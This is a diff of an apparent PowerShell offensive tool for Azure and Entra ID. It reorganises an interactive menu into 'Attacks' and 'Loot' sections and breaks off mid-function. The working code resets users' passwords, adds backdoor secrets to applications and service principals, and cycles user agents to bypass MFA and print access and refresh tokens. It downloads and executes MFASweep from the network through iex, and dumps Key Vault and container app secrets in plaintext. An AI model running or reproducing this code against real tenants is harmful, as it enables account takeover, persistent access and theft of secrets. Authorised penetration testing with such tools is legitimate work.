@@ -643,16 +643,14 @@ function QueriesMenu {
         Write-Host "3. Group Members"
         Write-Host "4. Role Assignments"
         Write-Host "5. Available Resources"
-        Write-Host "6. Key Vaults"
-        Write-Host "7. Storage"
-        Write-Host "8. Owned Objects"
-        Write-Host "9. Owned Applications"
-        Write-Host "10. Administrative Units (Graph only)"
-        Write-Host "11. Password Policy (Graph only)"
-        Write-Host "12. Get App Details (CLI only)"
-        Write-Host "13. Dynamic Groups (Graph only)"
-        Write-Host "14. Conditional Access Policies as low Priv User (needs AZ CLI and Graph Session and will only work till MS kills the Windows Graph API!!!)"
-        Write-Host "15. Raw Command Prompt"
+        Write-Host "6. Owned Objects"
+        Write-Host "7. Owned Applications"
+        Write-Host "8. Administrative Units (Graph only)"
+        Write-Host "9. Password Policy (Graph only)"
+        Write-Host "10. Get App Details (CLI only)"
+        Write-Host "11. Dynamic Groups (Graph only)"
+        Write-Host "12. Conditional Access Policies as low Priv User (needs AZ CLI and Graph Session and will only work till MS kills the Windows Graph API!!!)"
+        Write-Host "13. Raw Command Prompt"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
@@ -673,33 +671,27 @@ function QueriesMenu {
                 AvailableResourcesQuery
             }
             "6" {
-                AvailableKeyVaultsQuery
-            }
-            "7" {
-                StorageMenu
-            }
-            "8" {
                 OwnedObjectsQuery
             }
-            "9" {
+            "7" {
                 OwnedApplicationsQuery
             }
-            "10" {
+            "8" {
                 AdministrativeUnitsQuery
             }
-            "11" {
+            "9" {
                 PasswordPolicyQuery
             }
-            "12" {
+            "10" {
                 GetAppDetailsQuery
             }
-            "13" {
+            "11" {
                 DynamicGroupsQuery
             }
-            "14" {
+            "12" {
                 ConditionalAccessPoliciesQuery
             }
-            "15" {
+            "13" {
                 RawCommandPrompt
             }
             "B" {
@@ -1068,133 +1060,6 @@ function PasswordPolicyQuery {
     }
     catch {
         Write-Host "Error retrieving password policy: $_" -ForegroundColor Red
-    }
-
-    Write-Host "`nPress any key to return to the queries menu..."
-    [void][System.Console]::ReadKey($true)
-}
-
-# Function to query available Key Vaults and interact with secrets
-function AvailableKeyVaultsQuery {
-    Clear-Host
-    DisplayHeader
-    Write-Host "Available Key Vaults Query" -ForegroundColor Cyan
-
-    Write-Host "Select tool to use:" -ForegroundColor Yellow
-    Write-Host "1. Azure CLI" -ForegroundColor Yellow
-    Write-Host "2. Az PS Module" -ForegroundColor Yellow
-    $toolChoice = Read-Host
-
-    Start-Sleep -Seconds 2
-
-    try {
-        Clear-Host
-        DisplayHeader
-        $keyVaultList = @()
-
-        # List key vaults
-        try {
-            if ($toolChoice -eq "1") {
-                Write-Host "AZ CLI output:" -ForegroundColor Magenta
-                $cliOutput = az keyvault list --query "[].name" -o tsv
-                $keyVaultList = $cliOutput -split "`n"
-            } elseif ($toolChoice -eq "2") {
-                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
-                $psOutput = Get-AzKeyVault | Select-Object -ExpandProperty VaultName
-                $keyVaultList = $psOutput -split "`n"
-            } else {
-                Write-Host "Invalid selection, returning to queries menu." -ForegroundColor Red
-                return
-            }
-        } catch {
-            Write-Host "Error retrieving Key Vaults: $_" -ForegroundColor Red
-        }
-
-        if ($keyVaultList.Count -gt 0) {
-            while ($true) {
-                Write-Host "Select a Key Vault to explore:" -ForegroundColor Yellow
-                for ($i = 0; $i -lt $keyVaultList.Count; $i++) {
-                    Write-Host "$($i + 1). $($keyVaultList[$i])" -ForegroundColor Green
-                }
-                Write-Host "B. Back to tool selection" -ForegroundColor Cyan
-                Write-Host "M. Return to main menu" -ForegroundColor Cyan
-
-                $selectedOption = Read-Host "Enter a number to select a vault, 'B', or 'M'"
-
-                if ($selectedOption -eq "B") {
-                    break
-                }
-
-                if ($selectedOption -eq "M") {
-                    return
-                }
-
-                if ($selectedOption -ge 1 -and $selectedOption -le $keyVaultList.Count) {
-                    $selectedVault = $keyVaultList[$selectedOption - 1]
-                    Write-Host "`nExploring secrets in '$selectedVault' Key Vault..." -ForegroundColor Yellow
-
-                    # List secrets
-                    try {
-                        $secrets = if ($toolChoice -eq "1") {
-                            az keyvault secret list --vault-name $selectedVault --query "[].name" -o tsv
-                        } elseif ($toolChoice -eq "2") {
-                            Get-AzKeyVaultSecret -VaultName $selectedVault | Select-Object -ExpandProperty Name
-                            }
-                        
-                        $secretList = $secrets -split "`n"
-                        if ($secretList.Count -gt 0) {
-                            while ($true) {
-                                Write-Host "Select a secret to view its content:" -ForegroundColor Yellow
-                                for ($i = 0; $i -lt $secretList.Count; $i++) {
-                                    Write-Host "$($i + 1). $($secretList[$i])" -ForegroundColor Green
-                                }
-                                Write-Host "B. Back to vault selection" -ForegroundColor Cyan
-                                Write-Host "M. Return to main menu" -ForegroundColor Cyan
-
-                                $selectedSecret = Read-Host "Enter a number to view a secret, 'B', or 'M'"
-
-                                if ($selectedSecret -eq "B") {
-                                    break
-                                }
-
-                                if ($selectedSecret -eq "M") {
-                                    return
-                                }
-
-                                if ($selectedSecret -ge 1 -and $selectedSecret -le $secretList.Count) {
-                                    $secretName = $secretList[$selectedSecret - 1]
-                                    Write-Host "`nViewing content of secret '$secretName'..." -ForegroundColor Yellow
-
-                                    # Retrieve secret content
-                                    $secretContent = if ($toolChoice -eq "1") {
-                                        az keyvault secret show --vault-name $selectedVault --name $secretName --query "value" -o tsv
-                                    } elseif ($toolChoice -eq "2") {
-                                        Get-AzKeyVaultSecret -VaultName $selectedVault -Name $secretName -AsPlainText
-                                    }
-
-                                    Write-Host "Secret Content: $secretContent" -ForegroundColor Cyan
-                                    Write-Host "`nPress any key to return to secret selection..."
-                                    [void][System.Console]::ReadKey($true)
-                                } else {
-                                    Write-Host "Invalid selection, no secret chosen." -ForegroundColor Red
-                                }
-                            }
-                        } else {
-                            Write-Host "No secrets found in the Key Vault." -ForegroundColor Red
-                        }
-                    } catch {
-                        Write-Host "Error retrieving secrets: $_" -ForegroundColor Red
-                    }
-                } else {
-                    Write-Host "Invalid selection, no Key Vault chosen." -ForegroundColor Red
-                }
-            }
-        } else {
-            Write-Host "No Key Vaults found." -ForegroundColor Red
-        }
-    }
-    catch {
-        Write-Host "Error retrieving Key Vaults or secrets: $_" -ForegroundColor Red
     }
 
     Write-Host "`nPress any key to return to the queries menu..."
@@ -1745,8 +1610,376 @@ function RawCommandPrompt {
     }
 }
 
+# Attacks menu structure
+function AttacksMenu {
+    while ($true) {
+        Clear-Host
+        DisplayHeader
+        Write-Host "Attacks Menu" -ForegroundColor Cyan
+        Write-Host "1. Reset a User's Password via Graph PS Module"
+        Write-Host "2. Set New Secret for Application via Graph PS Module"
+        Write-Host "3. Set New Secret for Service Principal"
+        Write-Host "4. Try to bypass MFA with MFASweep"
+        Write-Host "5. Try to bypass MFA with GraphRunner"
+        Write-Host "B. Return to Main Menu"
+
+        $userInput = Read-Host -Prompt "Select an option"
+        switch ($userInput) {
+            "1" {
+                ResetUserPassword
+            }
+            "2" {
+                SetNewSecretForApplication
+            }
+            "3" {
+                SetNewSecretForServicePrincipal
+            }
+            "4" {
+                MFASweep
+            }
+            "5" {
+                GraphRunnerBypassMFA
+            }
+            "B" {
+                return
+            }
+            default {
+                Write-Host "Invalid selection, please try again."
+                Write-Host "`nPress any key to continue..."
+                [void][System.Console]::ReadKey($true)
+            }
+        }
+    }
+}
+
+# Function to reset a user's password via Graph
+function ResetUserPassword {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Reset a User's Password via Graph PS Module" -ForegroundColor Cyan
+    Write-Host "Enter the user's email or user ID:" -ForegroundColor Yellow
+    $userId = Read-Host
+
+    Write-Host "Enter the new password:" -ForegroundColor Yellow
+    $password = Read-Host
+
+    try {
+        $params = @{
+            passwordProfile = @{
+                forceChangePasswordNextSignIn = $false
+                forceChangePasswordNextSignInWithMfa = $false
+                password = $password
+            }
+        }
+        Update-MgUser -UserId $userId -BodyParameter $params
+        Write-Host "Password reset successfully for user $userId." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Error resetting password for user "$userId": $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nPress any key to return to the attacks menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
+# Function to set a new secret to an application
+function SetNewSecretForApplication {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Add New Secret for an Application via Graph PS Module" -ForegroundColor Cyan
+    Write-Host "Careful here. You need the Object ID, not the Application (client) ID!!!" -ForegroundColor Yellow
+    Write-Host "Enter the application's Object ID:" -ForegroundColor Yellow
+    $appId = Read-Host
+
+    try {
+        $passwordCred = @{
+            displayName = 'Created via AzurePwn'
+        }
+        # Create a new password credential
+        $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
+        
+        # Print the new password
+        Write-Host "The new secret for the Application is: $($newPassword.SecretText)" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Error setting new secret for application ID "$appId": $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nPress any key to return to the attacks menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
+# Function to set a new secret for a service principal
+function SetNewSecretForServicePrincipal {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Set New Secret for a Service Principal" -ForegroundColor Cyan
+    Write-Host "Careful here. You need the Object ID, not the Application ID!!!" -ForegroundColor Yellow
+    Write-Host "Enter the service principal's Object ID:" -ForegroundColor Yellow
+    $spId = Read-Host
+
+    Write-Host "Select tool(s) to use to set the secret:" -ForegroundColor Yellow
+    Write-Host "1. Azure CLI" -ForegroundColor Yellow
+    Write-Host "2. Az PS Module" -ForegroundColor Yellow
+    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
+    Write-Host "4. All" -ForegroundColor Yellow
+    $toolChoice = Read-Host
+
+    try {
+        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
+            Write-Host "AZ CLI output:" -ForegroundColor Magenta
+            $newSecret = az ad sp credential reset --id $spId --append --query 'password' -o tsv
+            Write-Host "The new secret for the service principal is: $newSecret" -ForegroundColor Green
+        }
+        
+        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
+            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
+            $newPassword = New-AzADSpCredential -ObjectId $spId -DisplayName 'Created via AzurePwn'
+            Write-Host "The new secret for the service principal is: $($newPassword.Secret)" -ForegroundColor Green
+        }
+        
+        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
+            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
+            $passwordCred = @{
+                displayName = 'Created via AzurePwn'
+            }
+            $newPassword = Add-MgServicePrincipalPassword -ServicePrincipalId $spId -PasswordCredential $passwordCred
+            Write-Host "The new secret for the service principal is: $($newPassword.SecretText)" -ForegroundColor Green
+        }
+    }
+    catch {
+        Write-Host "Error setting new secret for application ID "$spId": $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nPress any key to return to the attacks menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
+# Function to test various user agents to acquire an access token
+function GraphRunnerBypassMFA {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Testing User Agent Combinations to bypass MFA to get Graph Access Token via Dafthack's Graphrunner" -ForegroundColor Cyan
+    $username = Read-Host -Prompt "Username"
+    $password = Read-Host -Prompt "Password"
+
+    # Reset global token variable
+    $global:tokens = $null
+
+    # Define the device and browser combinations
+    $devices = @('Mac', 'Windows', 'AndroidMobile', 'iPhone')
+    $browsers = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+
+    # Label for nested loop
+    :OuterLoop foreach ($device in $devices) {
+        foreach ($browser in $browsers) {
+            try {
+                Write-Host "Attempting with Device: $device, Browser: $browser" -ForegroundColor Cyan
+                
+                # Attempt to acquire graph tokens using the generated user agent
+                $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
+                
+                # Checking if the global variable $tokens has been set
+                if ($global:tokens -and $global:tokens.access_token) {
+                    Write-Host "Successfully retrieved Graph Access Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
+                    Write-Host "You can use it in the auth menu or via Connect-MgGraph -AccessToken <TOKEN>" -ForegroundColor DarkGreen
+                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
+                    Write-Host "Successfully retrieved Refresh Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
+                    Write-Host "Use TokenTacticsV2 (Invoke-RefreshTo...) to exchange it for an Access Token to a FOCI app or directly to collect AzureHound data" -ForegroundColor DarkGreen
+                    Write-Host "Refresh Token: $($global:tokens.refresh_token)" -ForegroundColor DarkMagenta
+                    break OuterLoop  # Exit both loops if a token is retrieved
+                } else {
+                    Write-Host "Failed to retrieve token with $device and $browser combination" -ForegroundColor Red
+                }
+            }
+            catch {
+                Write-Host "Error with Device: $device, Browser: $browser | Error: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+    }
+
+    Write-Host "`nTesting completed. Press any key to return to the menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
+# Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
+function MFASweep {
+    Clear-Host
+    DisplayHeader
+    Write-Host "MFA Sweep" -ForegroundColor Cyan
+
+    # Download and execute MFASweep 
+    Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
+    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
+    Invoke-MFASweep
+    
+    Write-Host "`nPress any key to return to the queries menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
+# Login menu structure
+function LootMenu {
+    while ($true) {
+        Clear-Host
+        DisplayHeader
+        Write-Host "Loot Menu" -ForegroundColor Cyan
+        Write-Host "1. Key Vaults"
+        Write-Host "2. Storage"
+        Write-Host "3. Container Apps"
+        Write-Host "B. Return to Main Menu"
+
+        $userInput = Read-Host -Prompt "Select an option"
+        switch ($userInput) {
+            "1" {
+                LootKeyvaults
+            }
+            "2" {
+                LootStorageMenu
+            }
+            "3" {
+                LootContainerAppsMenu
+            }
+            "B" {
+                return
+            }
+            default {
+                Write-Host "Invalid selection, please try again."
+                Write-Host "`nPress any key to continue..."
+                [void][System.Console]::ReadKey($true)
+            }
+        }
+    }
+}
+
+# Function to query available Key Vaults and interact with secrets
+function LootKeyvaults {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Available Key Vaults Query" -ForegroundColor Cyan
+
+    Write-Host "Select tool to use:" -ForegroundColor Yellow
+    Write-Host "1. Azure CLI" -ForegroundColor Yellow
+    Write-Host "2. Az PS Module" -ForegroundColor Yellow
+    $toolChoice = Read-Host
+
+    Start-Sleep -Seconds 2
+
+    try {
+        Clear-Host
+        DisplayHeader
+        $keyVaultList = @()
+
+        # List key vaults
+        try {
+            if ($toolChoice -eq "1") {
+                Write-Host "AZ CLI output:" -ForegroundColor Magenta
+                $cliOutput = az keyvault list --query "[].name" -o tsv
+                $keyVaultList = $cliOutput -split "`n"
+            } elseif ($toolChoice -eq "2") {
+                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
+                $psOutput = Get-AzKeyVault | Select-Object -ExpandProperty VaultName
+                $keyVaultList = $psOutput -split "`n"
+            } else {
+                Write-Host "Invalid selection, returning to queries menu." -ForegroundColor Red
+                return
+            }
+        } catch {
+            Write-Host "Error retrieving Key Vaults: $_" -ForegroundColor Red
+        }
+
+        if ($keyVaultList.Count -gt 0) {
+            while ($true) {
+                Write-Host "Select a Key Vault to explore:" -ForegroundColor Yellow
+                for ($i = 0; $i -lt $keyVaultList.Count; $i++) {
+                    Write-Host "$($i + 1). $($keyVaultList[$i])" -ForegroundColor Green
+                }
+                Write-Host "B. Back to tool selection" -ForegroundColor Cyan
+                Write-Host "M. Return to main menu" -ForegroundColor Cyan
+
+                $selectedOption = Read-Host "Enter a number to select a vault, 'B', or 'M'"
+
+                if ($selectedOption -eq "B") {
+                    break
+                }
+
+                if ($selectedOption -eq "M") {
+                    return
+                }
+
+                if ($selectedOption -ge 1 -and $selectedOption -le $keyVaultList.Count) {
+                    $selectedVault = $keyVaultList[$selectedOption - 1]
+                    Write-Host "`nExploring secrets in '$selectedVault' Key Vault..." -ForegroundColor Yellow
+
+                    # List secrets
+                    try {
+                        $secrets = if ($toolChoice -eq "1") {
+                            az keyvault secret list --vault-name $selectedVault --query "[].name" -o tsv
+                        } elseif ($toolChoice -eq "2") {
+                            Get-AzKeyVaultSecret -VaultName $selectedVault | Select-Object -ExpandProperty Name
+                            }
+                        
+                        $secretList = $secrets -split "`n"
+                        if ($secretList.Count -gt 0) {
+                            while ($true) {
+                                Write-Host "Select a secret to view its content:" -ForegroundColor Yellow
+                                for ($i = 0; $i -lt $secretList.Count; $i++) {
+                                    Write-Host "$($i + 1). $($secretList[$i])" -ForegroundColor Green
+                                }
+                                Write-Host "B. Back to vault selection" -ForegroundColor Cyan
+                                Write-Host "M. Return to main menu" -ForegroundColor Cyan
+
+                                $selectedSecret = Read-Host "Enter a number to view a secret, 'B', or 'M'"
+
+                                if ($selectedSecret -eq "B") {
+                                    break
+                                }
+
+                                if ($selectedSecret -eq "M") {
+                                    return
+                                }
+
+                                if ($selectedSecret -ge 1 -and $selectedSecret -le $secretList.Count) {
+                                    $secretName = $secretList[$selectedSecret - 1]
+                                    Write-Host "`nViewing content of secret '$secretName'..." -ForegroundColor Yellow
+
+                                    # Retrieve secret content
+                                    $secretContent = if ($toolChoice -eq "1") {
+                                        az keyvault secret show --vault-name $selectedVault --name $secretName --query "value" -o tsv
+                                    } elseif ($toolChoice -eq "2") {
+                                        Get-AzKeyVaultSecret -VaultName $selectedVault -Name $secretName -AsPlainText
+                                    }
+
+                                    Write-Host "Secret Content: $secretContent" -ForegroundColor Cyan
+                                    Write-Host "`nPress any key to return to secret selection..."
+                                    [void][System.Console]::ReadKey($true)
+                                } else {
+                                    Write-Host "Invalid selection, no secret chosen." -ForegroundColor Red
+                                }
+                            }
+                        } else {
+                            Write-Host "No secrets found in the Key Vault." -ForegroundColor Red
+                        }
+                    } catch {
+                        Write-Host "Error retrieving secrets: $_" -ForegroundColor Red
+                    }
+                } else {
+                    Write-Host "Invalid selection, no Key Vault chosen." -ForegroundColor Red
+                }
+            }
+        } else {
+            Write-Host "No Key Vaults found." -ForegroundColor Red
+        }
+    }
+    catch {
+        Write-Host "Error retrieving Key Vaults or secrets: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nPress any key to return to the queries menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
 # Storage submenu
-function StorageMenu {
+function LootStorageMenu {
     while ($true) {
         Clear-Host
         DisplayHeader
@@ -2042,7 +2275,7 @@ function ListStorageResources {
                                & az storage entity query --account-name $accountName --table-name $selectedTable @($numResultsArg) --connection-string "$connectionString" -o table | Out-String
                             }
 
-                            Write-Host $tableItems
+                            Write-Host $tableItems -ForegroundColor DarkMagenta
                             Write-Host "`nPress any key to return to table selection..."
                             [void][System.Console]::ReadKey($true)
                         } else {
@@ -2104,15 +2337,15 @@ function ListBlobsInContainer {
         if ($authChoice -eq "1") {
             # Use current account
             $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --output table | Out-String
-            Write-Host $blobOutput
+            Write-Host $blobOutput -ForegroundColor DarkMagenta
         } elseif ($authChoice -eq "2") {
             # Use SAS token
             $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --sas-token "`"$sasToken`"" --output table | Out-String
-            Write-Host $blobOutput
+            Write-Host $blobOutput -ForegroundColor DarkMagenta
         } elseif ($authChoice -eq "3") {
             # Use connection string
             $blobOutput = az storage blob list --account-name $accountName --container-name $containerName --connection-string "$connectionString" --output table | Out-String
-            Write-Host $blobOutput
+            Write-Host $blobOutput -ForegroundColor DarkMagenta
         } else {
             Write-Host "Invalid selection, returning to storage menu." -ForegroundColor Red
         }
@@ -2125,35 +2358,23 @@ function ListBlobsInContainer {
     [void][System.Console]::ReadKey($true)
 }
 
-# Attacks menu structure
-function AttacksMenu {
+# Container Apps Management Menu
+function LootContainerAppsMenu {
     while ($true) {
         Clear-Host
         DisplayHeader
-        Write-Host "Attacks Menu" -ForegroundColor Cyan
-        Write-Host "1. Reset a User's Password via Graph PS Module"
-        Write-Host "2. Set New Secret for Application via Graph PS Module"
-        Write-Host "3. Set New Secret for Service Principal"
-        Write-Host "4. Try to bypass MFA with MFASweep"
-        Write-Host "5. Try to bypass MFA with GraphRunner"
+        Write-Host "Container Apps Menu" -ForegroundColor Cyan
+        Write-Host "1. List All Container Apps"
+        Write-Host "2. Loot Container App"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
         switch ($userInput) {
             "1" {
-                ResetUserPassword
+                ListContainerApps
             }
             "2" {
-                SetNewSecretForApplication
-            }
-            "3" {
-                SetNewSecretForServicePrincipal
-            }
-            "4" {
-                MFASweep
-            }
-            "5" {
-                GraphRunnerBypassMFA
+                LootContainerApp
             }
             "B" {
                 return
@@ -2167,164 +2388,174 @@ function AttacksMenu {
     }
 }
 
-# Function to reset a user's password via Graph
-function ResetUserPassword {
+# Function to list all Azure Container Apps
+function ListContainerApps {
     Clear-Host
     DisplayHeader
-    Write-Host "Reset a User's Password via Graph PS Module" -ForegroundColor Cyan
-    Write-Host "Enter the user's email or user ID:" -ForegroundColor Yellow
-    $userId = Read-Host
-
-    Write-Host "Enter the new password:" -ForegroundColor Yellow
-    $password = Read-Host
-
-    try {
-        $params = @{
-            passwordProfile = @{
-                forceChangePasswordNextSignIn = $false
-                forceChangePasswordNextSignInWithMfa = $false
-                password = $password
-            }
-        }
-        Update-MgUser -UserId $userId -BodyParameter $params
-        Write-Host "Password reset successfully for user $userId." -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Error resetting password for user "$userId": $_" -ForegroundColor Red
-    }
-
-    Write-Host "`nPress any key to return to the attacks menu..."
-    [void][System.Console]::ReadKey($true)
-}
-
-# Function to set a new secret to an application
-function SetNewSecretForApplication {
-    Clear-Host
-    DisplayHeader
-    Write-Host "Add New Secret for an Application via Graph PS Module" -ForegroundColor Cyan
-    Write-Host "Careful here. You need the Object ID, not the Application (client) ID!!!" -ForegroundColor Yellow
-    Write-Host "Enter the application's Object ID:" -ForegroundColor Yellow
-    $appId = Read-Host
-
-    try {
-        $passwordCred = @{
-            displayName = 'Created via AzurePwn'
-        }
-        # Create a new password credential
-        $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
-        
-        # Print the new password
-        Write-Host "The new secret for the Application is: $($newPassword.SecretText)" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Error setting new secret for application ID "$appId": $_" -ForegroundColor Red
-    }
-
-    Write-Host "`nPress any key to return to the attacks menu..."
-    [void][System.Console]::ReadKey($true)
-}
-
-# Function to set a new secret for a service principal
-function SetNewSecretForServicePrincipal {
-    Clear-Host
-    DisplayHeader
-    Write-Host "Set New Secret for a Service Principal" -ForegroundColor Cyan
-    Write-Host "Careful here. You need the Object ID, not the Application ID!!!" -ForegroundColor Yellow
-    Write-Host "Enter the service principal's Object ID:" -ForegroundColor Yellow
-    $spId = Read-Host
-
-    Write-Host "Select tool(s) to use to set the secret:" -ForegroundColor Yellow
+    Write-Host "List All Container Apps" -ForegroundColor Cyan
+    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
     Write-Host "1. Azure CLI" -ForegroundColor Yellow
     Write-Host "2. Az PS Module" -ForegroundColor Yellow
-    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
     Write-Host "4. All" -ForegroundColor Yellow
     $toolChoice = Read-Host
 
+    Start-Sleep -Seconds 2
+
     try {
+        Clear-Host
+        
+        
         if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
             Write-Host "AZ CLI output:" -ForegroundColor Magenta
-            $newSecret = az ad sp credential reset --id $spId --append --query 'password' -o tsv
-            Write-Host "The new secret for the service principal is: $newSecret" -ForegroundColor Green
+            Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
+            $cliOutput = az containerapp list --query "[].name" -o tsv | Out-String
+            Write-Host $cliOutput
         }
         
         if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
             Write-Host "AZ PS Module output:" -ForegroundColor Magenta
-            $newPassword = New-AzADSpCredential -ObjectId $spId -DisplayName 'Created via AzurePwn'
-            Write-Host "The new secret for the service principal is: $($newPassword.Secret)" -ForegroundColor Green
-        }
-        
-        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
-            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
-            $passwordCred = @{
-                displayName = 'Created via AzurePwn'
-            }
-            $newPassword = Add-MgServicePrincipalPassword -ServicePrincipalId $spId -PasswordCredential $passwordCred
-            Write-Host "The new secret for the service principal is: $($newPassword.SecretText)" -ForegroundColor Green
+            Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
+            $psOutput = Get-AzContainerApp | Format-Table | Out-String
+            Write-Host $psOutput
         }
     }
     catch {
-        Write-Host "Error setting new secret for application ID "$spId": $_" -ForegroundColor Red
+        Write-Host "Error retrieving container apps: $_" -ForegroundColor Red
     }
 
-    Write-Host "`nPress any key to return to the attacks menu..."
+    Write-Host "`nPress any key to return to the container apps menu..."
     [void][System.Console]::ReadKey($true)
 }
 
-# Function to test various user agents to acquire an access token
-function GraphRunnerBypassMFA {
+# Function to loot a Container App
+function LootContainerApp {
     Clear-Host
     DisplayHeader
-    Write-Host "Testing User Agent Combinations to bypass MFA to get Graph Access Token via Dafthack's Graphrunner" -ForegroundColor Cyan
-    $username = Read-Host -Prompt "Username"
-    $password = Read-Host -Prompt "Password"
+    Write-Host "Manage Specific Container App" -ForegroundColor Cyan
 
-    # Reset global token variable
-    $global:tokens = $null
+    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
+    Write-Host "1. Azure CLI" -ForegroundColor Yellow
+    Write-Host "2. Az PS Module" -ForegroundColor Yellow
+    $toolChoice = Read-Host
 
-    # Define the device and browser combinations
-    $devices = @('Mac', 'Windows', 'AndroidMobile', 'iPhone')
-    $browsers = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+    Start-Sleep -Seconds 2
 
-    # Label for nested loop
-    :OuterLoop foreach ($device in $devices) {
-        foreach ($browser in $browsers) {
-            try {
-                Write-Host "Attempting with Device: $device, Browser: $browser" -ForegroundColor Cyan
-                
-                # Attempt to acquire graph tokens using the generated user agent
-                $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
-                
-                # Checking if the global variable $tokens has been set
-                if ($global:tokens -and $global:tokens.access_token) {
-                    Write-Host "Successful access token retrieved with -Device=$device and -Browser=$browser combination:" -ForegroundColor DarkGreen
-                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
-                    break OuterLoop  # Exit both loops if a token is retrieved
+    # Store container apps with their resource group names
+    $containerAppsDictionary = @{}
+
+    try {
+        # List container apps using Azure CLI or Az PowerShell
+        if ($toolChoice -eq "1") {
+            Write-Host "Fetching Container Apps using Azure CLI..." -ForegroundColor Magenta
+            $cliOutput = az containerapp list --query "[].{name:name, rg:resourceGroup}" -o json | ConvertFrom-Json
+            foreach ($app in $cliOutput) {
+                $containerAppsDictionary[$app.name] = $app.rg
+            }
+        } elseif ($toolChoice -eq "2") {
+            Write-Host "Fetching Container Apps using Az PowerShell Module..." -ForegroundColor Magenta
+            $psOutput = Get-AzContainerApp | Select-Object Name, ResourceGroupName
+            foreach ($app in $psOutput) {
+                $containerAppsDictionary[$app.Name] = $app.ResourceGroupName
+            }
+        } else {
+            Write-Host "Invalid selection, returning to container apps menu." -ForegroundColor Red
+            return
+        }
+
+        $containerAppNames = @($containerAppsDictionary.Keys)
+
+        if ($containerAppNames.Count -gt 0) {
+            while ($true) {
+                Write-Host "Select a Container App to manage:" -ForegroundColor Yellow
+                for ($i = 0; $i -lt $containerAppNames.Count; $i++) {
+                    Write-Host "$($i + 1). $($containerAppNames[$i])" -ForegroundColor Green
+                }
+                Write-Host "B. Back to Container Apps Menu" -ForegroundColor Cyan
+                Write-Host "M. Return to main menu" -ForegroundColor Cyan
+
+                $selectedOption = Read-Host "Enter a number to select a container app, 'B', or 'M'"
+
+                if ($selectedOption -eq "B") {
+                    continue
+                }
+
+                if ($selectedOption -eq "M") {
+                    return
+                }
+
+                if ($selectedOption -ge 1 -and $selectedOption -le $containerAppNames.Count) {
+                    $selectedApp = $containerAppNames[$selectedOption - 1]
+                    $selectedRg = $containerAppsDictionary[$selectedApp]
+                    Write-Host "`nManaging Container App '$selectedApp' in Resource Group '$selectedRg'..." -ForegroundColor Yellow
+
+                    if ($toolChoice -eq "1") {
+                        $appDetails = az containerapp show --name $selectedApp --resource-group $selectedRg --output json
+                    } elseif ($toolChoice -eq "2") {
+                        $appDetails = Get-AzContainerApp -Name $selectedApp -ResourceGroupName $selectedRg | ConvertTo-Json
+                    }
+
+                    $appDetailsJson = $appDetails | ConvertFrom-Json
+                    Write-Host "Name: $($appDetailsJson.name)"
+                    Write-Host "Id: $($appDetailsJson.Id)"
+                    Write-Host "Secret: $($appDetailsJson.configuration.secret)"
+                    Write-Host "Identity Type: $($appDetailsJson.IdentityType)"
+                    Write-Host "SP Id: $($appDetailsJson.IdentityPrincipalId)"
+
+                    if ($appDetailsJson.configuration.secret) {
+                        Write-Host "Secrets found in configuration. Would you like to list secrets? (Y/N)" -ForegroundColor Yellow
+                        $secretChoice = Read-Host
+                        if ($secretChoice -eq "Y") {
+                            # Construct URI based on app ID
+                            $baseUri = "https://management.azure.com"
+                            $appId = $appDetailsJson.id
+                            $secretUri = "${baseUri}${appId}/listSecrets?api-version=2024-03-01"
+
+                            # Get access token
+                            $token = if ($toolChoice -eq "1") {
+                                $tokenResponse = az account get-access-token --query accessToken -o tsv
